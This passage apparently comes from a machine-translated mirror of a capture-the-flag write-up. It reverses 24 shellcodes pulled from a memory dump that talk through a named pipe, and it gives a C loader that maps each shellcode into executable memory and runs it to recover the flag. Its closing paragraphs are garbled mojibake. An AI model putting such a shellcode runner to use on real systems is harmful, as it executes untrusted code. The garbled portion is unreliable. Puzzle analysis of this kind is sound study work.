src="https://habrastorage.org/webt/u9/uo/mz/u9uomzuew2uy6ib7tdqpltzozao.png"></p><br><p> <strong>data_storage</strong> is small enough to contain some resident $DATA inside FILE record, so we can extract it. </p><br><p> This file contains shellcode. All it does is resolving CreateNamedPipeA by hash using special function (see Figure below) and calling it with <strong>"\.\pipe\zn_shell_stor"</strong> argument. </p><br><p><img src="https://habrastorage.org/webt/ag/d-/9v/agd-9vmbes5yrnupfxrucg9a3cs.png"></p><br><p> I highlighted part of this function, this bytes can be used to located other 24 shellcodes inside memory dump. </p><br><p> One of shellcode #21 contained references to other, it is probably the main one. </p><br><pre> <code class="plaintext hljs">Global\vtHAjnNbCecOeNAnVeQFmdRw Global\jGzXXZJbXGPYniopljDEdwuD Global\jpBuyMNJzdnpwHimVlcBkwGo Global\ArlCJOxJFOKRkqOLcBhvjYqj Global\THxjCBohxSlNgCFbwJsHujqk Global\BOiJhsLFBuZdsFdCrLKEucpJ Global\iYxszVIFfsuzzEmGwgOQeEcb Global\NOluZoXPJalShopCCuNnWQbR Global\GCrtPmNEAOsZpSNNBdiYQfgz Global\pVVgeqcREhXSgKCwhkeyfTXw Global\trsQPehKvlxBJhEqIPtwzjxi Global\ngVrhgAEqcDssFsNerrAZsFz Global\KiZvGyiMnyTgvQdFNGcudfTY Global\FzXvKPKGCPMAERklFMXVMYga Global\nCZpFZPtyidhFOvVeemfyJAC Global\pjRmfOLLBXIbsJholoasvrqC Global\mhOVYcYRKgWdABAsgkvrcOOM Global\syGiShcLTXfQYGAAiafYBxoF Global\KbFVsPCPZrfVlUIQlvVoJLXW Global\XbuYiHCxQLTLApuToFldJIgI Global\auFqpIQAlsHcvjPEakqHyIeA Global\MrnXOMJvHmYBxRfkbLBUYWgn Global\GYVOmvrLhCpgQUPfnOshzzem Global\qaswedfrtghyujkiol121232 \\.\pipe\zn_shell_stor</code> </pre> <br><p> Every shellcode is started with CALL $+X instruction (E8 ?? ?? ?? ??), followed by data block and executable code. Code is looking for some functions and evaluates logic based on data read from pipe <strong>"\.\pipe\zn_shell_stor"</strong> . </p><br><div class="scrollable-table"><table><thead><tr><th> File </th><th> Tags </th><th> Mutex </th></tr></thead><tbody><tr><td> b1 </td><td> mov mov </td><td> Global\GCrtPmNEAOsZpSNNBdiYQfgz </td></tr><tr><td> b2 </td><td> SBOX "axfksyBLjRfMFZXdINqyTXcekgCxPRNpKtmTAj SUdmElMsuKYkmFYbJxSbXwxmvQ" </td><td> Global\NOluZoXPJalShopCCuNnWQbR </td></tr><tr><td> b3 </td><td> inc byte [rbp+0Ch] </td><td> Global\ngVrhgAEqcDssFsNerrAZsFz </td></tr><tr><td> b4 </td><td> repne scasb strlen() == 18 </td><td> Global\jpBuyMNJzdnpwHimVlcBkwGo </td></tr><tr><td> b5 </td><td> ?? </td><td> Global\ArlCJOxJFOKRkqOLcBhvjYqj </td></tr><tr><td> b6 </td><td> xor BUFFER "\x31\x2A\x72\xC8\x5E\x08\xC5\xFE \x07\x44\xCB\xEB\x76\x3B\xE1\x3A\x83" </td><td> Global\MrnXOMJvHmYBxRfkbLBUYWgn </td></tr><tr><td> b7 </td><td> ?? </td><td> Global\GYVOmvrLhCpgQUPfnOshzzem </td></tr><tr><td> b8 </td><td> cmp word [rbp+0Ch], 12h </td><td> Global\KbFVsPCPZrfVlUIQlvVoJLXW </td></tr><tr><td> b9 </td><td> ?? </td><td> Global\BOiJhsLFBuZdsFdCrLKEucpJ </td></tr><tr><td> b10 </td><td> ?? </td><td> Global\iYxszVIFfsuzzEmGwgOQeEcb </td></tr><tr><td> b11 </td><td> cmp </td><td> Global\pjRmfOLLBXIbsJholoasvrqC </td></tr><tr><td> b12 </td><td> add xor cl x2 </td><td> Global\nCZpFZPtyidhFOvVeemfyJAC </td></tr><tr><td> b13 </td><td> inc [rbp+0Ch] </td><td> Global\auFqpIQAlsHcvjPEakqHyIeA </td></tr><tr><td> b14 </td><td> dw[rbp+0Ch] = dw[rbp+0Ch] + dw[rbp+0Ch] </td><td> Global\syGiShcLTXfQYGAAiafYBxoF </td></tr><tr><td> b15 </td><td> WIN! Sleep Beep </td><td> Global\XbuYiHCxQLTLApuToFldJIgI </td></tr><tr><td> b16 </td><td> save byte </td><td> Global\mhOVYcYRKgWdABAsgkvrcOOM </td></tr><tr><td> b17 </td><td> add xor cl x2 </td><td> Global\FzXvKPKGCPMAERklFMXVMYga </td></tr><tr><td> b18 </td><td> zero rbp (0, 211h, 80h) </td><td> Global\trsQPehKvlxBJhEqIPtwzjxi </td></tr><tr><td> b19 </td><td> ?? </td><td> Global\KiZvGyiMnyTgvQdFNGcudfTY </td></tr><tr><td> b20 </td><td> Read from C:\beeps\flag.txt </td><td> Global\vtHAjnNbCecOeNAnVeQFmdRw </td></tr><tr><td> b21 </td><td> MAIN </td><td></td></tr><tr><td> b22 </td><td> Xor </td><td> Global\THxjCBohxSlNgCFbwJsHujqk </td></tr><tr><td> b23 </td><td> cmp dw[rbp+0Ch], 256 dec </td><td> Global\pVVgeqcREhXSgKCwhkeyfTXw </td></tr><tr><td> b24 </td><td> beep(1000, 1100) </td><td> Global\jGzXXZJbXGPYniopljDEdwuD </td></tr></tbody></table></div><br><p> Understanding of shellcode actions is a little bit hard because everything tied together via pipe (A calls B, B calls C and etc.). We are required to jump from one shellcode to another during reversing. </p><br><p> I decided to execute it all and see what happens. All shellcodes was saved as files <strong>bN</strong> , where N is a number in range from 1 to 24 in order of appearing in memory dump. Dump #21 is the main dispatcher (it must be loaded first). File <strong><em>C:\beeps\flag.txt</em></strong> should be present in system for #20 to work. </p><br><pre> <code class="plaintext hljs">#include &lt;windows.h&gt; void load_shellcode(int index) { FILE* fp; DWORD dwThread; int size; CHAR filename[32]; sprintf_s(filename, "b%i", index); fopen_s(&amp;fp, filename, "rb"); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); LPVOID pMem = VirtualAlloc( NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ); printf("Loaded %i | size=%i | at %p\n", index, size, pMem); fread(pMem, 1, size, fp); CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMem, 0, 0, &amp;dwThread); fclose(fp); } int main() { load_shellcode(21); Sleep(1000); for (int i = 1; i &lt;= 24; i++) { if (i == 21) continue; load_shellcode(i); } while (1) Sleep(1000); }</code> </pre> <br><p> I created <strong>C:\beeps\flag.txt</strong> with some dummy content (length is 17 as hinted by one of the shellcodes) and also set a breakpoint at module doing xor with buffer (#6). </p><br><p> Program executed and flag showed up in memory after XOR operation. </p><br><p> Flag: <strong><em>zn{$ucH <em>SL0W</em> !pC}</em></strong> </p></div></div><br><p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рд╕рд┐рд╕реЗрдВрдЯрд░ рдиреЗ 6 рджрд┐рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдХрд╛рд░реНрдп рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ред </font><font style="vertical-align: inherit;">рдЖрдк рдЗрд╕реЗ </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдпрд╣рд╛рдБ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ </font><font style="vertical-align: inherit;">ред</font></font></p><br><h2>  рдХреБрдЫ рдЖрдБрдХрдбрд╝реЗ </h2><br><p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдЗрд╕ рд╕рд╛рд▓, рджреЛ рд╣рдЬрд╛рд░ рд╕реЗ рдЕрдзрд┐рдХ рд▓реЛрдЧреЛрдВ рдиреЗ рдХрд╛рд░реНрдп рдкреГрд╖реНрдареЛрдВ рдХрд╛ рджреМрд░рд╛ рдХрд┐рдпрд╛ рдпрд╛ рд╕рдорд╛рдзрд╛рди рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдлрд╛рдЗрд▓реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХреАрдВред </font><font style="vertical-align: inherit;">рдЙрд╕реА рд╕рдордп 136 рдкреНрд░рддрд┐рднрд╛рдЧрд┐рдпреЛрдВ рдиреЗ рдзреНрд╡рдЬ рдХреЛ рдкрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ред</font></font></p><br><p>       . <br>       тАФ ASR-EHD  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">Digital Security</a> .      (AV1ct0r),     22 15   . </p><br><p>     Protected Shell  RuCTFE.       тАФ 10.   vos,     1 26. </p><br><p> ,     .   12-13    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">ZeroNights</a> . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/hi472416/">https://habr.com/ru/post/hi472416/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../hi472404/index.html">2 рдбреА рдЯрдХрд░рд╛рд╡ рдХреА рдЧрдгрдирд╛: рдЧрд┐рд▓реНрдмрд░реНрдЯ-рдЬреЙрдирд╕рди-рдХреАрд░реНрддрд┐ рдПрд▓реНрдЧреЛрд░рд┐рджрдо</a></li>
<li><a href="../hi472406/index.html">рдкрд┐рдЬреНрдЬрд╛ рдбрд┐рд▓реАрд╡рд░реА рдХреЗ рджреМрд░рд╛рди рдбреЗрдЯрд╛ рд╕реЗрдВрдЯрд░ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░ рдХрд░реЗрдВ</a></li>
<li><a href="../hi472410/index.html">рдЙрдкрд▓рдмреНрдз рд░рдВрдЧ рдкреНрд░рдгрд╛рд▓реА рдбрд┐рдЬрд╛рдЗрдирд┐рдВрдЧ</a></li>
<li><a href="../hi472412/index.html">рд╕рд┐рд╕реНрдЯрдо рд╡рд┐рд╢реНрд▓реЗрд╖рдХ рдФрд░ рдЙрддреНрдкрд╛рдж рдореИрдЯреНрд░рд┐рдХреНрд╕ - рд╣рд┐рд▓рд╛рдПрдВ рд▓реЗрдХрд┐рди рдорд┐рд╢реНрд░рдг рдирд╣реАрдВ?</a></li>
<li><a href="../hi472414/index.html">рдлрд╛рд╕реНрдЯ рдиреНрдпреВрдЯреНрд░реЙрди рд░рд┐рдПрдХреНрдЯрд░реЛрдВ рдХрд╛ рд▓рдВрдмрд╛ рдЗрддрд┐рд╣рд╛рд╕ рдФрд░ рдПрдХ рдмрдВрдж рдИрдВрдзрди рдЪрдХреНрд░ рдХрд╛ рд╡рд╛рджрд╛</a></li>
<li><a href="../hi472418/index.html">рдХрд╕реНрдЯрдо рд╡рд┐рдХрд╛рд╕ рдХреЗ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдХреИрд╕реЗ рд░рдЦрд╛ рдЬрд╛рдП</a></li>
<li><a href="../hi472420/index.html">рд╕реНрдердЧрд┐рдд рдХрд┐рдП рдЧрдП рд╡рд╛рджреЗ рдХреЗ рд▓рд┐рдП рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХреЛ рдЕрдзрд┐рдХ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдмрдирд╛рдирд╛</a></li>
<li><a href="../hi472422/index.html">Sber X RamblerFront рдФрд░ рдорд┐рд▓реЛ</a></li>
<li><a href="../hi472426/index.html">рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рд╡реАрдХ 43: IoT рд╣рдиреАрдкреЙрдЯреНрд╕ рдХреА рд╕реАрдХреНрд░реЗрдЯ рд▓рд╛рдЗрдл</a></li>
<li><a href="../hi472428/index.html">рдЯрд╛рд░реЗрдВрдЯреВрд▓ рдХреБрдмреЗрд░рдиреЗрдЯреНрд╕ рдСрдкрд░реЗрдЯрд░</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>